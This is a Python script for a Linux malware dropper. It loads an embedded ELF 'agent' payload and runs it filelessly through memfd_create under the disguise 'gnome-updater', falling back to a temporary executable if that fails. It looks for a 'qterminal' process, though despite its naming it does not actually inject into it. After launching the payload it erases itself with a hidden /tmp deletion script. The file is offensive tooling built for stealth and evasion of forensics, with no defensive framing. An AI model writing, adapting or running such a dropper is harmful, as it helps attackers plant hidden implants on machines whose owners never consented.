import os
import sys
import platform
import ctypes
import subprocess
import time
import tempfile
from agent_payload_embed import EMBEDDED_PAYLOAD

SELF_DELETE = True
MASQUERADE_AS = "gnome-updater"

# fallback if os.memfd_create not available
if not hasattr(os, 'memfd_create'):
    libc = ctypes.CDLL("libc.so.6")
    def memfd_create(name, flags):
        return libc.syscall(319, name.encode(), flags)
    os.memfd_create = memfd_create

def self_delete():
    path = sys.argv[0]
    deleter = f"/tmp/.deleter_{int(time.time())}.sh"
    with open(deleter, "w") as f:
        f.write(f"#!/bin/bash\nsleep 2\nrm -f '{path}'\nrm -f '{deleter}'\n")
    os.chmod(deleter, 0o700)
    subprocess.Popen(["/bin/bash", deleter])

def run_memfd(payload):
    try:
        fd = os.memfd_create(MASQUERADE_AS, 0)
        os.write(fd, payload)
        os.lseek(fd, 0, os.SEEK_SET)
        subprocess.Popen([f"/proc/self/fd/{fd}"], close_fds=True)
        return True
    except Exception as e:
        print(f"[!] memfd_create failed: {e}")
        return False

def run_temp_exec(payload):
    try:
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(payload)
            temp_path = f.name
        os.chmod(temp_path, 0o755)
        subprocess.Popen([temp_path], close_fds=True)
        return True
    except Exception as e:
        print(f"[!] Temp execution failed: {e}")
        return False

def inject(payload, target_name="qterminal"):
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            with open(f"/proc/{pid}/comm", "r") as f:
                name = f.read().strip()
                if name == target_name:
                    print(f"[+] Found target PID {pid} ({name})")
                    print("[*] Trying memfd injection...")
                    if run_memfd(payload):
                        return True
                    else:
                        print("[*] Falling back to tempfile injection...")
                        return run_temp_exec(payload)
        except:
            continue
    print("[!] Target process not found.")
    return False

def main():
    print("[*] Dropper started.")

    if platform.system() != "Linux":
        print("[!] This dropper only supports Linux.")
        return

    if not EMBEDDED_PAYLOAD.startswith(b'\x7fELF'):
        print("[!] Invalid payload — not an ELF binary.")
        return

    success = inject(EMBEDDED_PAYLOAD)

    if success:
        print("[+] Agent launched.")
        if SELF_DELETE:
            self_delete()
    else:
        print("[!] Injection failed.")

if __name__ == "__main__":
    main()